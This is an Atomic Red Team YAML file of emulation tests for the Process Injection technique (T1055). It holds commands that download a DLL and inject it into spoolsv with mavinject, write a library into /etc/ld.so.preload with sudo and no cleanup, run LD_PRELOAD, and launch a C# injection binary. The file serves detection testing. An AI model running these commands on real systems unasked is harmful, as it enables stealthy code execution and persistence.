attack_technique:
- T1055
display_name: Process Injection
atomic_tests:
- name: Process Injection via mavinject.exe
  description: |
    Windows 10 Utility To Inject DLLS.

    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
  supported_platforms:
  - windows
  input_arguments:
    process_id:
      description: PID of input_arguments
      type: Integer
      default: (get-process spoolsv).id
    dll_payload:
      description: DLL to Inject
      type: Path
      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Utility to inject must exist on disk at specified location (#{dll_payload})
    prereq_command: |
      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
  executor:
    command: |
      $mypid = #{process_id}
      mavinject $mypid /INJECTRUNNING #{dll_payload}
    name: powershell
    elevation_required: true
- name: Shared Library Injection via /etc/ld.so.preload
  description: "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. \n"
  supported_platforms:
  - linux
  input_arguments:
    path_to_shared_library_source:
      description: Path to a shared library source code
      type: Path
      default: PathToAtomicsFolder/T1055/src/Linux/T1055.c
    path_to_shared_library:
      description: Path to a shared library object
      type: Path
      default: PathToAtomicsFolder/T1055/bin/T1055.so
  dependency_executor_name: bash
  dependencies:
  - description: |
      The shared library must exist on disk at specified location (#{path_to_shared_library})
    prereq_command: |
      if [ -f #{path_to_shared_library ]; then exit 0; else exit 1; fi;
    get_prereq_command: "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}        \n"
  executor:
    command: |
      sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
    cleanup_command: ""
    name: bash
    elevation_required: true
- name: Shared Library Injection via LD_PRELOAD
  description: |
    This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

    Upon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.
  supported_platforms:
  - linux
  input_arguments:
    path_to_shared_library_source:
      description: Path to a shared library source code
      type: Path
      default: PathToAtomicsFolder/T1055/src/Linux/T1055.c
    path_to_shared_library:
      description: Path to a shared library object
      type: Path
      default: PathToAtomicsFolder/T1055/bin/T1055.so
  dependency_executor_name: bash
  dependencies:
  - description: |
      The shared library must exist on disk at specified location (#{path_to_shared_library})
    prereq_command: |
      if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
  executor:
    command: |
      LD_PRELOAD=#{path_to_shared_library} ls
    name: bash
- name: Process Injection via C#
  description: |
    Process Injection using C#
    reference: https://github.com/pwndizzle/c-sharp-memory-injection
    Excercises Five Techniques
    1. Process injection
    2. ApcInjectionAnyProcess
    3. ApcInjectionNewProcess
    4. IatInjection
    5. ThreadHijack
    Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.
  supported_platforms:
  - windows
  input_arguments:
    exe_binary:
      description: Output Binary
      type: Path
      default: PathToAtomicsFolder\T1055\bin\T1055.exe
  executor:
    command: |
      #{exe_binary}
    name: command_prompt

